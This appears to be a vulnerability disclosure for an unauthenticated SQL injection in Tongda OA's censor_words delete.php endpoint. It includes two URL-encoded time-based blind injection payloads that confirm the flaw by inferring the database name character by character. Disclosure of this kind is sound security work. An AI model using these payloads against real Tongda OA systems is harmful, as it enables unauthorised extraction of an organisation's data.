Unauthorized SQL injection vulnerability exists in Tongda OA

version:v2017 version and versions below v11.10

1.
Route: general/system/censor_words/module/delete.php

There is an injected parameter: $DELETE_STR

The code here is very concise. When $DELETE_STR is not empty, the parameters are directly spliced ​​into the SQL statement. Since the parentheses are closed here, there is a bypass.

![image](https://github.com/kenankkkkk/cve/assets/149234800/5085675e-7c19-447c-82db-a2dad666e324)

2.Payload
We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.

POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```
![image](https://github.com/kenankkkkk/cve/assets/149234800/af5405af-7a04-44dd-ac76-f412ee6a9f80)

And when we change 116 to 115, there will be no delay, indicating the existence of SQL injection.

POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(115)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
``
![image](https://github.com/kenankkkkk/cve/assets/149234800/c5e29f54-7a62-450a-9830-53885b41b5c0)
